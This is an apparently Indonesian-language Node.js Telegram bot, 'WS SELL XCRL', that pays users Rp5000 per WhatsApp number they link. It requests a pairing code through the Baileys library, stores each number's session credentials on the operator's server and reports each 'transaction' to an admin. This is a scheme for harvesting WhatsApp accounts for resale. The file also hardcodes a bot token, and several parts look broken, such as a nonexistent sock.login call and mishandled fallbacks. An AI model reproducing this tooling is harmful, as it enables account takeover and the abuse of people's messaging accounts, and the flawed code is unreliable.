// ==============================================
// 🤖 WS SELL XCRL • ADMIN PANEL
// ⚠️ Tidak resmi WA • Risiko blokir
// ==============================================
const { default: makeWASocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const { Bot, InlineKeyboard } = require('grammy');
const express = require('express');
const path = require('path');

// KONFIGURASI
const BOT_TOKEN = '8611704774:AAGgwMWUJvimvfej5VCWoRlm87CyJocZbTQ';
const ADMIN_ID = 8783239765;
let REWARD = 5000;
let WD_METHODS = { dana: '08xxxxxxx', ovo: '08xxxxxxx', shopeepay: '08xxxxxxx', bank: 'BCA 123456789' };

// Penjaga nyala 24 jam
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (_, res) => res.send('🤖 WS SELL XCRL Aktif 24 Jam'));
app.listen(PORT, () => console.log('🌐 Server siap'));

const bot = new Bot(BOT_TOKEN);
const pending = new Map();
const saldo = {};
const transaksi = [];

async function adminPanel(ctx) {
  const kb = new InlineKeyboard()
    .text(`💰 Ubah Reward (Rp${REWARD})`, 'set_reward').row()
    .text(`💳 Kelola WD`, 'kelola_wd').row()
    .text(`👤 Lihat User`, 'lihat_user').row()
    .text(`📋 Riwayat`, 'riwayat');
  await ctx.reply(`⚙️ *PANEL ADMIN WS SELL XCRL*`, { reply_markup: kb, parse_mode: 'Markdown' });
}

bot.command('start', async ctx => {
  const uid = ctx.from.id;
  saldo[uid] = saldo[uid] || 0;
  if (uid === ADMIN_ID) return adminPanel(ctx);
  await ctx.reply(`👋 Selamat Datang 🚀\n\n📌 Kirim nomor: *+628xxxxxxx*\n📲 Pilih verifikasi lewat WA\n🔑 Kirim WSCode\n✅ Dapat Rp${REWARD.toLocaleString()}\n\n💳 WD: Dana • OVO • ShopeePay • Bank`, { parse_mode: 'Markdown' });
});

bot.command('saldo', ctx => ctx.reply(`💵 Saldo: *Rp${(saldo[ctx.from.id]||0).toLocaleString()}*`, { parse_mode: 'Markdown' }));
bot.command('wd', ctx => {
  const daftar = Object.entries(WD_METHODS).map(([k,v])=>`• ${k.toUpperCase()}: ${v}`).join('\n');
  ctx.reply(`💳 Cara WD:\n${daftar}\n\nContoh: /wd 10000 dana`, { parse_mode: 'Markdown' });
});

bot.callbackQuery('set_reward', ctx => ctx.reply('✏️ Ketik: *reward 7500*'));
bot.callbackQuery('kelola_wd', ctx => ctx.reply('✏️ Contoh: *wd dana 08123456789*'));
bot.callbackQuery('lihat_user', ctx => ctx.reply('👤 Pengguna:\n' + Object.entries(saldo).map((u,s)=>`ID: ${u} = Rp${s}`).join('\n')||'Belum ada'));
bot.callbackQuery('riwayat', ctx => ctx.reply('📋 Riwayat:\n' + transaksi.slice(-10).join('\n')||'Kosong'));

bot.on('message:text', async ctx => {
  const uid = ctx.from.id, teks = ctx.text.trim();
  if (teks.startsWith('/')) return;

  if (uid === ADMIN_ID) {
    if (teks.startsWith('reward ')) { const v = parseInt(teks.split(' ')[1]); if(v>0) { REWARD=v; return ctx.reply(`✅ Reward: Rp${v}`); } }
    if (teks.startsWith('wd ')) { const [_, m, ...d] = teks.split(' '); if(m) { WD_METHODS[m] = d.join(' '); return ctx.reply(`✅ WD ${m} diperbarui`); } }
  }

  if (/^\+?\d{10,15}$/.test(teks)) {
    const nomor = teks.replace('+','');
    await ctx.reply('⏳ Memproses...');
    try {
      const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, `auth_${uid}_${nomor}`));
      const sock = makeWASocket({ auth: state, printQRInTerminal: false });
      sock.ev.on('creds.update', saveCreds);
      sock.ev.on('connection.update', async ({connection})=>{
        if (connection === 'open') {
          const kode = await sock.requestPairingCode(nomor);
          pending.set(uid, {sock, nomor});
          ctx.reply(`✅ Nomor diterima!\n\n📲 Buka WA → Masukkan nomor\n👉 Pilih: *Verifikasi lewat WhatsApp*\n\n🔑 Kirim WSCode: \`${kode}\``, { parse_mode: 'Markdown' });
        }
      });
    } catch { ctx.reply('❌ Gagal, ulangi kirim nomor'); }
  } else if (pending.has(uid)) {
    const {sock, nomor} = pending.get(uid);
    try {
      await sock.login(teks.replace(/\s/g,''));
      saldo[uid] = (saldo[uid]||0) + REWARD;
      transaksi.push(`${new Date().toLocaleString()} | +${nomor} | +Rp${REWARD}`);
      ctx.reply(`✅ *BERHASIL!* 🎉\n📞 +${nomor}\n💰 +Rp${REWARD}\n💵 Saldo: Rp${saldo[uid]}`, { parse_mode: 'Markdown' });
      bot.api.sendMessage(ADMIN_ID, `📥 Transaksi Baru\n👤 ${uid}\n📞 +${nomor}\n💵 Rp${REWARD}`);
    } catch { ctx.reply('❌ Kode salah/kadaluarsa'); }
    pending.delete(uid);
  } else ctx.reply('⚠️ Contoh: *+628123456789*');
});

bot.start();
console.log('🤖 WS SELL XCRL Berjalan');
  
